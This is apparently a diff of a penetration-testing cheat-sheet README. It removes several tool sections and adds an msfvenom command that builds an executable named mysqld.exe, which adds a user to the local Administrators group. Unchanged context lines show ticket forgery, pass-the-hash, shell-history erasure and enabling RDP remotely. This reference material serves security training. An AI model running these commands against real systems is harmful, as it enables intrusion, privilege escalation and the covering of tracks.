@@ -85,17 +85,6 @@ sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
 
 * install the cross-architecture C header files with the following command:
 * `sudo apt-get install gcc-multilib -y`
-## grep
-So let's say you have to crack a password that's from a website that uses just a 4 characters long passphrase. To save up time you can just make a copy of your rockyou.txt or whatever monstrous passlist your using and then filter the copy into a new file that has only the 4 characters long entries (hence this **_grep_** one liner) from your rockyou-copy.txt. Copy is needed to not to mess up the original one, you can never be cautious enough ;)
-
-* `grep -E '^.{4}$' rockyou-copy.txt > only4words.txt`
-
-## SUID
-**_Set-user Identification_** are files with special root priv permissions. It happens when root doesn't want to make a user root user just in certain cases when user runs some files that requires sudo permissions. Finding these files are imporant as SUID can be abused. SUID starts with a 4 and SGID -which is similar to SUID starts with a 2. The only difference between the two is that when a script or command with SGID (Set-group Identification) permission runs, it runs as if it were a member of the same group in which the file is a member.
-
-If a lowercase letter “l” appears in the group’s execute field, means that the setgid bit is on, and the execute bit for the group is off or denied.
-
-* `find / -perm +6000 2>/dev/null | grep '/bin/'` only use grep if you need it or looking for a very specific location
 
 ## Silver Ticket and Golden Ticket
 
@@ -134,11 +123,6 @@ If a lowercase letter “l” appears in the group’s execute field, means that
 * `Rubeus.exe ptt /ticket:ticket.kirbi`
 * `PsExec.exe \\dc01.krbtown.local cmd`
 
-## fping
-Helps you to ping a range of IP addresses.
-
-* `fping -a -g 192.168.0.10 192.168.0.255` the `-a` is for all hosts alive and the `-g` is for the range of IP addresses.
-
 ## dir (Win)
 Searching in **_Windows_** using the `dir` command we have the following switches available: (credit: find the original post by __computerhope.com__ [here](https://www.computerhope.com/dirhlp.htm)) 
 
@@ -164,7 +148,7 @@ Searching in **_Windows_** using the `dir` command we have the following switche
 1. `function erase_history { local HISTSIZE=0; }`
 2. `erase_history`
 
-## RDP with local file share
+## RDP (rdesktop) with local file share
 
 * `rdesktop -u <username> -d <domain> -p <password> -r disk:local="/home/kali/Desktop/fileshare" <host IP>:<PORT>`
 
@@ -174,13 +158,6 @@ Searching in **_Windows_** using the `dir` command we have the following switche
 1. `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"` enabling Remote Desktop via powershell
 2. `xfreerdp /u:<username> /p:'<password>' /v:<target IP>` now we can connect to it from kali
 3. To disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`
-
-## gobuster
-There are different ways you can use **_gobuster_** this is the one I use most of the times. The `-u` is for the host name `-w` is for the wordlist and `-t 40` is for the threads so it won't take forever. The `tee gobuster-initial` is so I can redirect the output to this file and can analyze it later if needed.
-
-* `gobuster dir -u http://<IP or domain> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40 | tee gobuster-initial`
-
-* with the same way but using the `vhost` option one can enumerate subdomains as well just changed the `dir` to `vhost` in the above command and maybe use a different wordlist for that purpose
 
 ## sed
 
@@ -265,35 +242,10 @@ If you are interested in more depth on this matter check out the cyberchef's web
 
 * *_Windows add user:_* `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`
 
-* *_rev shell:_* `msfvenom -p windows/shell_reverse_tcp lhost=<local host IP> lport=<local host listening port> -f raw > exploit.php`
-
-## sql / mysql
-There are many more thing that can be done by using sql, for example if there is an option for that you can list the data of all employees and if it's defined in the database who's admin or not when logged in and you can write to this database you can create a new employee with admin rights then use those credentials to log into the system. I left this section here for the newcomers, maybe I'll add to it later on.
-
-* how to connect to it: `mysql -u <username> -p -h <IP>`
-* to view the tables: `source example.sql`
-* to select a database: `USE <db name>;`
-* displaying the tables: `SHOW TABLES;`
-* display everything from the employees database: `SELECT * FROM employees;`
+* _add user to the local administrator group:_ `msfvenom -p windows/x64/exec CMD="net localgroup Administrators <username> /add" -f exe -o mysqld.exe`
 
 ## nmap
-You can always look up for an nmap script which is usually stored in `ls /usr/share/nmap/scripts/` and can use them with the `--script <script name>`. For example to check for the infamous *_eternal blue_* exploit you would use `nmap -p 445 --script smb-vuln-ms17-010.nse <target>`.
-
-* `nmap -sn <192.168.0.1/24>` or `nmap -sn 192.168.0.1-15` or `nmap -sn 192.168.0.*` or `nmap -sn 192.168.0.12*` are different ways for checking a range of IPs. The `-sn` is for the ping scan to discover live hosts on the network. Very useful if on a black box assessment.
-* `nmap -sn -iL hostlist.txt` if you want to use a file containing the list of IPs you want to check.
-* if you already know the hosts are alive you can use the `-Pn` option to skip the ping scan and maybe just try to fingerprint the OS: `nmap -Pn -O 192.168.0.1`
-* if you have to scan hundreds of hosts we should at first limit OS recon to just the promising ones: `nmap -O --osscan-limit 192.168.1-125`
-* to check if smb singing is disabled on any of the /24 subnet we can use `nmap --script smb2-security-mode.nse -p 445 192.168.0.0/24` finding the script on the same location I showed you at the beginning of this section.
-* Checking if nmap can find any known vulnerability against the smb service: `nmap --script smb2-security-mode.nse -p 445 192.168.0.0/24`
-
-## A real life scenario using nmap
-If you're dropped in an enviroment without anything, check your IP address on the network, then run these scans to identify other machines, their purpose and services, version numbers, open ports etc with nmap.
-
-1. `nmap -sn 172.16.37.0/24 -oA initial_discovery.nmap` to check for live hosts on the network and save the output in all formats into the _initial_discovery.nmap_ file.
-2. `cat initial_discovery.nmap | grep for | grep -v "\.234" | cut -d " " -f 5 > ips.txt` we need to exclude our own IP which ends with _.234_ hence we need the `-v` switch with grep, and `cut -d " " -f 5` will cut the spaces and keeps the 5th field which is the IP address from `Nmap scan report for <IP>`
-3. Finally `sudo nmap -sV -n -O -p- -Pn -T4 -iL ips.txt -A --open -oA final_discovery.nmap` which is `-sV` to get the service version number, `-n` disabling reverse DNS lookup, `-O` is for OS fingerprinting, `-p-` scanning all ports, `-Pn` skip the ping scan, treat all hosts as live, `-T4` is for performance, `-iL` to use the IPs from the ips.txt file and `-A --open` to get all information on the open ports, `-oA` to save the output in a file.
-
-One more thing: if you need to generate a nice html report from the output you can use *_xsltproc_*:
+If you need to generate a nice html report from the output you can use *_xsltproc_*:
 
 * `sudo xsltproc final_discovery.xml -o nmap_DATE_TARGET.html`
 
@@ -304,13 +256,6 @@ One more thing: if you need to generate a nice html report from the output you c
 
 ### pass the hash
 * pass the hash, Win: `pth-winexe -U Administrator%'<admin hash>' //<target IP> cmd.exe`
-
-## smbclient
-Just a couple of things here.
-
-* `smbclient -L //IP` to list the available shares
-* once connected you can use the `prompt` command for smbclient to not to ask you for a prompt every time you want to download something
-* `recursive` is used to be able to download something recursively from a folder 
 
 ## sqlmap
 One of my favorite tecniques I learned from [ippsec](https://ippsec.rocks/?#) is to capture a login request with Burp and save it in a file like login.req, then in sqlmap I can just use `sqlmap -r login.req --level 5 --risk 3` to try to find a vuln.
@@ -334,6 +279,14 @@ If the target is vulnerable for the get request (see above) we can get a shell o
 
 * removing credentials from known_hosts for ssh `ssh-keygen -f "/home/user/.ssh/known_hosts" -R "[<IP>]:<PORT>"`
 * ssh fingerprint `ssh-keygen -l -f id_rsa`
+* or (if you don't have a config file create one, nano does that automatically for you)
+* `nano ~/.ssh/config`
+* ```
+```
+Host github.com
+	User git
+	IdentityFile ~/.ssh/githubkey
+```
 
 *_This section is under development_*
 
@@ -553,7 +506,7 @@ bind-key -n MouseDown2Pane run "tmux set-buffer \"$(xclip -o -sel clipboard)\"; 
 * it has to be installed on the VM: `sudo apt update && sudo apt install -y --reinstall virtualbox-guest-x11 && sudo reboot -f`
 
 ## wfuzz
-Enlists subdomains based on a wodlist, here using top5000.txt from seclist. `--hw 290` is needed so 404 pages won't show up in the search results.
+Enlists subdomains based on a wordlist, here using top5000.txt from seclist. `--hw 290` is needed so 404 pages won't show up in the search results.
 
 * `wfuzz -c -f sub-fighter -w top5000.txt -u http://<domain> -H "HOST: Fuzz.domain.com" --hw 290`
 
@@ -602,7 +555,8 @@ The best scanner for Wordpress sites.
 
 ****
 
-### This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses swites, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.
+#### This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses swites, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.
 
-## The world is at your fingertips 💯
+### The world is at your fingertips 💯
+
 ![world100](images/003_hacker_hoodie.jpg)
